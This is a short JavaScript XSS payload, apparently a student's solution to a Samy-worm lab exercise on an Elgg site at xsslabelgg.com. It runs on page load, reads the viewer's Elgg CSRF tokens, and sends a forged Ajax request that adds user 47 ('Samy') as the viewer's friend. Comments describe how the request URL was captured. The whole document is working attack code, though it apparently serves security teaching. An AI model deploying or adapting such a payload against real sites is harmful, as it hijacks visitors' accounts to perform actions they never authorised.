<script type="text/javascript">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the HTTP request to add Samy as a friend.

	//var sendurl=...; //FILL IN
	// Javascript code to access user guid
	if(elgg.session.user.guid!=47)
	{
		var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token+ts+token;
		// I got the url model from when a request is sent to SAMY(Inspect-> Network -> GET -> Headers -> Request URL)
		// When friend request is send to samy, this url is sent

		//Create and send Ajax request to add friend
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
	}
	
	}
</script>


